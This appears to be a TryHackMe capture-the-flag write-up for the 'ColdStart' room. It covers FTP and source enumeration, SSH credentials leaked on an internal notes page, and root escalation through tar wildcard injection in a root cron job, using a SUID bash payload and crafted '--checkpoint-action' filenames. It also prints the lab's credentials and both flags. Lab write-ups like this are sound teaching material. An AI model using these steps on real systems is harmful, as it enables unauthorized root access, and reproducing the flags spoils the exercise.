# ColdStart - TryHackMe Writeup ( Cron-job to get into root ).

Difficulty: Easy

Platform: TryHackMe

Topics: FTP, Source Code Review, Information Disclosure, Credential Reuse, Tar Wildcard Injection, Cron Job Privilege Escalation



## Enumeration

### Nmap Scan

```bash
sudo nmap -sCV -Pn 10.48.149.58
```

### Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Gunicorn
```

Interesting findings:

* FTP service allows anonymous login.
* HTTP service is running a Python web application.
* SSH service available for remote access.

---

## FTP Enumeration

Anonymous login was enabled on the FTP server.

```bash
ftp 10.48.149.58
```

Login:

```text
Name: anonymous
230 Login successful.
```

Directory listing:

```text
/pub
└── backup.tar.gz
```

Downloaded and extracted the archive:

```bash
get backup.tar.gz
tar -xzf backup.tar.gz
```

The archive contained the source code of a Flask web application.

---

## Source Code Review

Reviewing `app.py` revealed the following comment:

```python
# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```

This disclosed an internal hostname:

```text
kestrel.thm
```

---

## Accessing Internal Resources

Browsing to:

```text
http://kestrel.thm/admin/notes
```

revealed internal notes containing SSH credentials:

```text
=== INTERNAL ===

SSH access for staging:
user: webdev
pass: V0ltLabs#summer

- Mara
```

---

## Initial Access

Using the recovered credentials:

```bash
ssh webdev@10.48.149.58
```

Successfully obtained a shell as `webdev`.

### User Flag

```bash
cat ~/user.txt
```

```text
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

---

# Privilege Escalation

## Cron Job Enumeration

Checking scheduled tasks:

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Interesting entry:

```text
# Volt Labs staging backup - runs as root

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The backup process executes every minute as **root** and archives everything inside:

```text
/opt/backups
```

---

## Tar Wildcard Injection

The cron job uses:

```bash
tar czf /var/backups/uploads.tgz *
```

Using a wildcard (`*`) allows attacker-controlled filenames to be interpreted as command-line arguments by `tar`.

### Create Payload Script

Move into the backup directory:

```bash
cd /opt/backups
```

Create a payload that copies `/bin/bash` and sets the SUID bit:

```bash
echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" > shell.sh
chmod +x shell.sh
```

### Create Malicious Tar Arguments

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash shell.sh"
```

Directory contents:

```text
--checkpoint=1
--checkpoint-action=exec=bash shell.sh
shell.sh
```

---

## Triggering the Vulnerability

Within one minute the root cron job executed.

The malicious filenames were interpreted as tar options:

```text
--checkpoint=1
--checkpoint-action=exec=bash shell.sh
```

This caused `tar` to execute our payload script as root.

Verification:

```bash
ls -l /tmp/rootbash
```

Output:

```text
-rwsr-sr-x 1 root root ... /tmp/rootbash
```

The SUID bit is set.

---

## Root Shell

Execute the SUID bash binary:

```bash
/tmp/rootbash -p
```

Root shell obtained:

```text
rootbash-5.2#
```

---

## Root Flag

```bash
cat /root/flag.txt
```

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

# Attack Path Summary

1. Enumerated open services using Nmap.
2. Discovered anonymous FTP access.
3. Retrieved a backup archive containing Flask source code.
4. Identified internal hostname `kestrel.thm`.
5. Accessed `/admin/notes` and recovered SSH credentials.
6. Logged in as `webdev`.
7. Enumerated cron jobs and found a root-owned tar backup task.
8. Exploited Tar Wildcard Injection using `--checkpoint-action`.
9. Created a SUID root shell.
10. Escalated privileges to root and captured the final flag.

## Flags

### User

```text
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

### Root

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```
